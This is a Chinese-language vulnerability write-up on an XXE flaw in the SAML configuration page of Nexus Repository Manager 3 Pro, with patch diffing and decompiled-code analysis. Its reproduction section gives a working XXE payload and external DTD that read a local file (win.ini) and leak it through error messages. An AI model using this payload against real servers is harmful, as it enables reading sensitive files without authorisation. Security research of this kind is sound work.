**作者：r00t4dm@Cloud-Penetrating Arrow Lab & Longofo@知道创宇404实验室 **  
**时间：2020年12月16日**

最近Nexus Repository Manager3[安全公告](https://support.sonatype.com/hc/en-us/sections/203012668-Security-Advisories)更新了一个XXE漏洞，虽然需要管理权限才能利用，并且Nexus
Repository
Manager3在较高的版本中也会强制更改以前较低版本使用的默认密码`admin/admin123`，最后漏洞触发也很简单，但是过程还是挺有意思，并且不会受到jdk高版本导致不能带换行的问题，列目录、读文件可以带出任意字符，除了二进制文件外，没有找到能编码的协议。

### 补丁

[diff](https://github.com/sonatype/nexus-public/compare/release-3.28.1-01...release-3.29.0-02)下最高漏洞版本3.28.1-01和修复版本3.29.0-02：

![](https://images.seebug.org/content/images/2020/12/6148bae3-6d2c-4ab8-ad79-9f517cba46d0.png-w331s)

可以看到在一个SafeXml#configureValidator中做了限制加载外部dtd的操作，可以注意到这个configureValidator是新增的方法而不是在原方法中修复，但是只是个工具类。

### 漏洞复现

来到后台Saml的功能点：

![](https://images.seebug.org/content/images/2020/12/17/1608175448000-4.png-w331s)

看到这个大大的XML输入框就知道大概率是有XML操作的。

简单测试下能不能进行dtd请求，如果能的话很可能读取文件也可以：

![](https://images.seebug.org/content/images/2020/12/17/1608175448000-5.png-w331s)

点击保存就能看到进行了请求。测试了下读文件，可以利用ftp、http等协议带出单行文件，看了下jdk版本在windows是使用的自带的8u252，@r00t4dm在mac上的安装包不会自带jdk，使用的是系统的，那么linux下也是系统的，所以试用的是较低版本的jdk，是可以带换行的。后面看了下返回包，居然把异常返回到了json，那么我们可以通过报错xml将任何文本字符带出了，包括`\n`、`#`、`<`等文本字符。

payload:

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE ANY [
            <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
            <!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/my.dtd">
            %dtd;
            %send;
            ]>
    <ANY>xxe</ANY>
    
    dtd：
    <!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM '%file;'>"
    >
    %all;

看下效果：

![](https://images.seebug.org/content/images/2020/12/0bf79ae9-5633-46cb-92c2-893c9dd19d52.png-w331s)

其他带`#`、`<`等字符的文件也都可以。

### 漏洞分析

既然configureValidator是新增的方法，而且是一个static方法，那么在最新版本中大概率就有其他类调用这个方法了来修复了。在github开源的3.29.0-02代码中搜索configureValidator，没有搜到任何结果，这个地方就很奇怪了，难道是动态隐式调用？但是前面configureValidator是一个新增的方法并且是一个静态方法，感觉不太可能动态隐式调用。因为之前也弄过Nexus的漏洞，他的安装包lib中有许多代码没有在github那个开源的仓库中，所以就反编译了3.29.0-02版本所有的lib包，一搜索configureValidator，果然有调用而且就此一处：

![](https://images.seebug.org/content/images/2020/12/a841d149-775d-43e5-b880-312ea9e45673.png-w331s)

接着又往上搜SamlMetadataTool的调用，都是带有Saml字眼的相关类在调用。所以猜想会有个Saml的功能，去[官方文档](https://help.sonatype.com/repomanager3/system-configuration/user-authentication/saml)搜索下：

![](https://images.seebug.org/content/images/2020/12/17/1608175449000-3.png-w331s)

看到这个描述是不是有点激动呢？猜测就是这个位置了。按照描述去后台配置点，发现并不能使用这个SAML功能，再看文档说的式要Pro版本才能用这个功能，可以去官网[申请试用](https://www.sonatype.com/nexus/repository-pro)。

从上面的发包可以看到处理url为`/service/rest/internal/ui/saml`，在github开源部分的代码中依然是搜不到的，在反编译的代码中搜索`/ui/saml`可以找到处理类:

![](https://images.seebug.org/content/images/2020/12/f0f96268-8e33-4dd0-9305-c93c4a37cea5.png-w331s)

下面是调用栈：

![](https://images.seebug.org/content/images/2020/12/17/1608175449000-8.png-w331s)

前面调用栈太长就不copy出来了。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1431/>

